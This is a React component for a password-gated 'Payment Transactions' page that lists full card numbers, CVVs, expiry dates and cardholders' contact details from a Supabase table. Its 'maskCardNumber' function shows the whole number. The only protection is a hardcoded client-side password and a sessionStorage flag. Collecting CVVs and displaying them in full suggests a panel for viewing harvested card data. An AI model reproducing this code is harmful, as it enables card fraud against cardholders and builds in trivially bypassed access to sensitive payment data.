import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Table, TableBody, TableCaption, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from 'sonner';
import { ChevronDown, ChevronUp } from 'lucide-react';

interface PaymentTransaction {
  id: string;
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  address: string;
  zip_code: string;
  phone: string;
  email: string;
  amount: number;
  status: string;
  created_at: string;
  error_message: string | null;
}

const PaymentTransactions = () => {
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [transactions, setTransactions] = useState<PaymentTransaction[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [statusFilter, setStatusFilter] = useState<string>('all');
  const [expandedRows, setExpandedRows] = useState<Set<string>>(new Set());
  const navigate = useNavigate();

  const SECRET_PASS = 'Animal@123';

  useEffect(() => {
    // Check if already authenticated
    const authStatus = sessionStorage.getItem('paymentAuth');
    if (authStatus === 'authenticated') {
      setIsAuthenticated(true);
      fetchTransactions();
    }
  }, [statusFilter]); // Add statusFilter as dependency

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === SECRET_PASS) {
      sessionStorage.setItem('paymentAuth', 'authenticated');
      setIsAuthenticated(true);
      fetchTransactions();
    } else {
      toast.error('Incorrect password');
    }
  };

  const fetchTransactions = async () => {
    try {
      setIsLoading(true);
      let query = supabase
        .from('payments')
        .select('*')
        .order('created_at', { ascending: false });

      // Apply status filter if not 'all'
      if (statusFilter !== 'all') {
        query = query.eq('status', statusFilter);
      }

      const { data, error } = await query;

      if (error) throw error;
      
      setTransactions(data || []);
    } catch (error) {
      console.error('Error fetching transactions:', error);
      toast.error('Failed to load transactions');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    sessionStorage.removeItem('paymentAuth');
    setIsAuthenticated(false);
    setPassword('');
    navigate('/');
  };

  const maskCardNumber = (cardNumber: string) => {
    if (!cardNumber) return '';
    // Return the full card number with spaces for better readability
    return cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const toggleRow = (id: string) => {
    const newExpandedRows = new Set(expandedRows);
    if (newExpandedRows.has(id)) {
      newExpandedRows.delete(id);
    } else {
      newExpandedRows.add(id);
    }
    setExpandedRows(newExpandedRows);
  };

  if (!isAuthenticated) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="w-full max-w-md p-8 space-y-8 bg-white rounded-lg shadow-md">
          <div className="text-center">
            <h2 className="text-2xl font-bold text-gray-900">Payment Transactions</h2>
            <p className="mt-2 text-sm text-gray-600">Please enter the secret pass to continue</p>
          </div>
          <form className="mt-8 space-y-6" onSubmit={handleLogin}>
            <div className="space-y-4">
              <Input
                type="password"
                placeholder="Enter secret pass"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full"
                required
              />
            </div>
            <div>
              <Button type="submit" className="w-full">
                View Transactions
              </Button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="container p-6 mx-auto">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Payment Transactions</h1>
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-2">
            <span className="text-sm font-medium">Status:</span>
            <Select 
              value={statusFilter}
              onValueChange={(value) => setStatusFilter(value)}
            >
              <SelectTrigger className="w-[180px]">
                <SelectValue placeholder="Filter by status" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">All Transactions</SelectItem>
                <SelectItem value="pending">Pending</SelectItem>
                <SelectItem value="completed">Completed</SelectItem>
                <SelectItem value="failed">Failed</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Button 
            variant="outline" 
            size="sm" 
            onClick={() => fetchTransactions()}
            disabled={isLoading}
          >
            {isLoading ? 'Refreshing...' : 'Refresh'}
          </Button>
        </div>
        <Button variant="outline" onClick={handleLogout}>
          Logout
        </Button>
      </div>
      
      <div className="border rounded-md overflow-hidden">
        <Table>
          <TableCaption>A list of all payment transactions.</TableCaption>
          <TableHeader className="bg-gray-50">
            <TableRow>
              <TableHead className="w-[180px]">Date & Time</TableHead>
              <TableHead>Card</TableHead>
              <TableHead>Name</TableHead>
              <TableHead>Amount</TableHead>
              <TableHead>Status</TableHead>
              <TableHead className="w-[50px]"></TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {isLoading ? (
              <TableRow>
                <TableCell colSpan={6} className="text-center py-4">
                  Loading transactions...
                </TableCell>
              </TableRow>
            ) : transactions.length === 0 ? (
              <TableRow>
                <TableCell colSpan={6} className="text-center py-4">
                  No transactions found
                </TableCell>
              </TableRow>
            ) : (
              transactions.flatMap((tx) => [
                <TableRow key={tx.id} className="cursor-pointer hover:bg-gray-50" onClick={() => toggleRow(tx.id)}>
                  <TableCell>
                    <div className="font-medium">
                      {new Date(tx.created_at).toLocaleDateString()}
                    </div>
                    <div className="text-sm text-gray-500">
                      {new Date(tx.created_at).toLocaleTimeString()}
                    </div>
                  </TableCell>
                  <TableCell>
                    <div className="font-mono">{maskCardNumber(tx.card_number)}</div>
                    <div className="text-sm text-gray-500">Exp: {tx.expiry_date}</div>
                  </TableCell>
                  <TableCell>
                    <div className="font-medium">{tx.cardholder_name}</div>
                    <div className="text-sm text-gray-500">{tx.email}</div>
                    <div className="text-sm text-gray-500">{tx.phone}</div>
                  </TableCell>
                  <TableCell className="font-medium">
                    ${typeof tx.amount === 'number' ? tx.amount.toFixed(2) : '0.00'}
                  </TableCell>
                  <TableCell>
                    <span className={`px-2 py-1 text-xs rounded-full ${
                      tx.status === 'completed' 
                        ? 'bg-green-100 text-green-800' 
                        : tx.status === 'failed' 
                          ? 'bg-red-100 text-red-800' 
                          : 'bg-yellow-100 text-yellow-800'
                    }`}>
                      {tx.status.charAt(0).toUpperCase() + tx.status.slice(1)}
                    </span>
                  </TableCell>
                  <TableCell className="text-right">
                    {expandedRows.has(tx.id) ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                  </TableCell>
                </TableRow>,
                expandedRows.has(tx.id) && (
                  <TableRow key={`${tx.id}-details`} className="bg-gray-50">
                    <TableCell colSpan={6} className="p-4">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <h3 className="font-medium">Card Details</h3>
                          <div className="grid grid-cols-2 gap-2 text-sm">
                            <div className="text-gray-500">Card Number:</div>
                            <div className="font-mono">{maskCardNumber(tx.card_number)}</div>
                            
                            <div className="text-gray-500">Expiry:</div>
                            <div>{tx.expiry_date || 'N/A'}</div>
                            
                            <div className="text-gray-500">CVV:</div>
                            <div className="font-mono">{tx.cvv || '•••'}</div>
                            
                            <div className="text-gray-500">Cardholder:</div>
                            <div>{tx.cardholder_name || 'N/A'}</div>
                          </div>
                        </div>
                        
                        <div className="space-y-2">
                          <h3 className="font-medium">Billing Details</h3>
                          <div className="grid grid-cols-2 gap-2 text-sm">
                            <div className="text-gray-500">Email:</div>
                            <div>{tx.email || 'N/A'}</div>
                            
                            <div className="text-gray-500">Phone:</div>
                            <div>{tx.phone || 'N/A'}</div>
                            
                            <div className="text-gray-500">Address:</div>
                            <div>
                              {tx.address ? (
                                <>
                                  <div>{tx.address}</div>
                                  <div>{tx.zip_code} {tx.country}</div>
                                </>
                              ) : 'N/A'}
                            </div>
                          </div>
                        </div>
                        
                        <div className="space-y-2">
                          <h3 className="font-medium">Transaction Details</h3>
                          <div className="grid grid-cols-2 gap-2 text-sm">
                            <div className="text-gray-500">Transaction ID:</div>
                            <div className="font-mono">{tx.id}</div>
                            
                            <div className="text-gray-500">Amount:</div>
                            <div>${typeof tx.amount === 'number' ? tx.amount.toFixed(2) : '0.00'}</div>
                            
                            <div className="text-gray-500">Status:</div>
                            <div>
                              <span className={`px-2 py-1 text-xs rounded-full ${
                                tx.status === 'completed' 
                                  ? 'bg-green-100 text-green-800' 
                                  : tx.status === 'failed' 
                                    ? 'bg-red-100 text-red-800' 
                                    : 'bg-yellow-100 text-yellow-800'
                              }`}>
                                {tx.status.charAt(0).toUpperCase() + tx.status.slice(1)}
                              </span>
                            </div>
                            
                            {tx.error_message && (
                              <>
                                <div className="text-gray-500">Error:</div>
                                <div className="text-red-600">{tx.error_message}</div>
                              </>
                            )}
                          </div>
                        </div>
                      </div>
                    </TableCell>
                  </TableRow>
                )
              ])
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  );
};

export default PaymentTransactions;
